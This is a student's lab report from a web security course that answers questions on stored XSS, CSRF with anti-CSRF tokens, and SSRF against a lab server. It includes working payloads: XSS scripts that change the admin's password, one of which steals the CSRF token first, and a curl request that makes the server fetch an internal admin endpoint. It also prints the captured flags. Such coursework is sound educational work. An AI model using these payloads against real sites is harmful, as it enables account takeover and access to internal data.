# SLH - LAB01

Rhyan Robertson

## 2 Basic CSRF

### 2.1. The website is also vulnerable to an XSS but you won’t detect it with a `<script>alert(1)</script>.` How can you detect it?

We cannot detect it using `alert();` because we don't see the result of the form submission.

### 2.2. Try to exfiltrate the admin cookie with the XSS. It does not work because of http-only. Explain what is http-only and how it prevents the exfiltration.

The http-only flag prevents the client side script from accessing the cookie. This helps mitigate CRSF attacks because if the admin cannot read/edit his own cookie, the attacker cannot either.

### 2.3. The website is also vulnerable to a CSRF. Which script is vulnerable?

The contact form is because it sends a message to the administrator.

### 2.4. What is the flag of this challenge?

The flag is : **uM}&+6*qLwFet}AX**

### 2.5. How did you obtain the flag? Describe clearly your attack. In particular, explain where the XSS is and what type of XSS it is ?

I used a **Stored XSS** attack by sending a script that runs on the admins browser.

Using the contact form, we can send a message to the administrator who sees them directly in his DOM. Thus we can make the admin execute the following code without them needing to do anything else other than open the page to view the messages.

```js
Hello
<script>
let newPassword = {password: "rhyan"};

fetch('profile/rhyan.robertson@heig-vd.ch_admin', {
    method: 'POST',
    headers: {'Content-type':'application/json'},
    body: JSON.stringify(newPassword)
})           
</script>
```

This script then imitates the admin changing the password from the **New password** form on the profile page. We do this by sending the same POST request as the form would have.

## 3 More Advanced CSRF

### 3.1. What is an anti-CSRF token? Explain in details how it works

The server generates a unique, pseudo-random, "unpredictable" and "secret" value that is stored both server and client side. It's used to verify that a future HTTP request is made by the current user (by matching both values).

Typically, the value is stored in a hidden html element on the client-side.

### 3.2. How do you see that the form is protected with an anti-CSRF token?

This hiddent input is a clue : `<input type="hidden" name="_csrf" value="oKuj5aK5-hbwr8t570AyARJi6-IapyiKwxaY">`

### 3.3. The website is also vulnerable to an XSS. What is the flag of this challenge?

p+)[4/MhHEetD3fZ

### 3.4. How did you obtain the flag? Describe clearly your attack

We caputre the current csrf token of the admin and use it to send the request.

```js
var csrf;
var xmlhttp = new XMLHttpRequest();

xmlhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        let textblock = this.responseText;
        let lines = textblock.split('\n');
        let line = lines.at(24);
        csrf = line.substring(60, line.length - 3);
        

        fetch('profile/rhyan.robertson@heig-vd.ch_admin', {
            method: 'POST',
            headers: {'Content-type':'application/json'},
            body: JSON.stringify({
                password: "1234",
                _csrf: csrf
            })
        })
    }
};
xmlhttp.open("GET", "/profile/rhyan.robertson@heig-vd.ch", true);
xmlhttp.send();
```

### 3.5. How would you secure the website?

Check and sanitize (e.g. escaping or filtering control characters and validating) messages received before displaying them.

<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>

## 4 SSRF

### 4.1. The flag is confidential, it should not be indexed by search engines robots. Where is the flag? How did you find this information?

Thanks to the info that search engine robots should not index the flag, we can guess that it's disallowd in the <http://iict-mv310-slh:8082/robots.txt> file.

Location : <http://iict-mv310-slh:8082/api/admin/flag>

### 4.2. You are not allowed to access the flag. Exploit an SSRF to obtain it. What is the flag? Hint: Read the javascript code of the page

Flag : `SLH22{zfrHW42XZMgpoyvEk}`

### 4.3. How did you obtain the flag? Describe clearly your attack

We can use the test api to get the server admin to access a url and send us a response. Since the admin has the access rights to /api/admin/flag, we get the flag in response :

The request :

```http
POST /api/webhook/test HTTP/1.1
Host: iict-mv310-slh:8082
Content-Type: application/json
Content-Length: 64

{"url":"http://localhost:8082/api/admin/flag", "message":"test"}
```

Send it with curl :

```bash
curl --location --request POST 'http://iict-mv310-slh:8082/api/webhook/test' \
--header 'Content-Type: application/json' \
--data-raw '{"url":"http://localhost:8082/api/admin/flag", "message":"test"}'
```

Response :

```json
{"res":"Not a valid Discord webhook","webhook_data":{"flag":"SLH22{zfrHW42XZMgpoyvEk}"}}
```

### 4.4. How would you prevent this attack ?

Validate the url on the server-side and block same domain requests with a proxy.